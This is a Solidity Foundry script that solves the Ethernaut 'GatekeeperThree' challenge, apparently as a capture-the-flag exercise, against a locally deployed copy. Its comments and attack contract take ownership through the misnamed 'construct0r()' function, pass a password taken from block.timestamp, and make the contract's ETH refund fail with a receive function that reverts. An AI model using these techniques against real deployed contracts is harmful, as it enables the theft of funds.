// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";

contract GatekeeperThreeSolution is Script {
    // $ forge script script/GatekeeperThree.s.sol --tc GatekeeperThreeSolution

    function run() external {
        GatekeeperThree gateKeeperInstance = new GatekeeperThree();

        // --- Attack Starts From Here ---
        // - The contract `GatekeeperThree`, has three keepers that we need to path them, to be the entrant, and the path the challenge.
        // - For the first keeper, we need to be the owner of the keeper contract + tx.origin != msg.sender
        // - We can path tx.origin check by making the call using a contract, and to become the owner of the contract we can call `construct0r()` function.
        //
        // - For the second keeper, we need to change `allowEntrance` to true. We set this variable to true when firing `getAllowance()` with the correct password value.
        // - The password is checked using the `trick` contract.
        // - `trick::checkPassword()` checks for the password value, and it is true, it returns true
        // - The first value of `password` variable is set on the creation of a new instance of Trick contract, by setting its value to `block.timestamp`.
        // - We can update the trick contract in the `GatekeeperThree` using `createTrick()` function.
        // - So we will create a trick contract using `GatekeeperThree::createTrick()`, and in the same transaction, we will call `GatekeeperThree::getAllowance()`, as we need to pass the same `block.timestamp` to pass the password check.
        //
        // - For the third check, The `Gatekeeper` balance should be > 0.001 ETH, and when sending ETH to the caller, the tx should revert.
        // - We can send the balance to the contract before doing our attack.
        // - And to revert the receiving of ETH, we can revert the transaciotn on receive function. Remember the caller is a contract
        //
        // - We will make our attack contract to do all these things in one function call (to make it one transaction), and we will pass the three keepers, and pass the challenge

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // Sending ETH > 0.001 to the GateKeeper address, this should occuar
        // To pass the third keeper
        (bool success,) = address(gateKeeperInstance).call{value: 0.01 ether}("");
        require(success, "Failed to send ETH to the Gatekeeper");

        GatekeeperAttack attackContract = new GatekeeperAttack(payable(address(gateKeeperInstance)));

        console.log("entrant:", gateKeeperInstance.entrant());
        console.log("-- Attack --");
        attackContract.attack();
        console.log("entrant:", gateKeeperInstance.entrant());
    }
}

contract GatekeeperAttack {
    GatekeeperThree gateKeeperInstance;

    constructor(address payable target) {
        gateKeeperInstance = GatekeeperThree(target);
    }

    // Preventing receiving ETH to pass third keeper
    receive() external payable {
        revert("I don't receive ETH");
    }

    function attack() public {
        // being the owner of the contract
        gateKeeperInstance.construct0r();

        // When creating the ticked, the password will be `block.timestamp`
        gateKeeperInstance.createTrick();

        // We will fire `getAllowance` with block.timestamp, to unlock `allowEntrance` (second Keeper)
        gateKeeperInstance.getAllowance(uint256(block.timestamp));

        // We will enter the GateKeeper
        // 1. msg.sender == owner && tx.origin != msg.sender | Pass keeper one
        // 2. allowEntrance == true | Pass keeper two
        // 3. Keeper has > 0.001 ether, and sending ether to us will fail | Pass keeper three
        gateKeeperInstance.enter();
    }
}
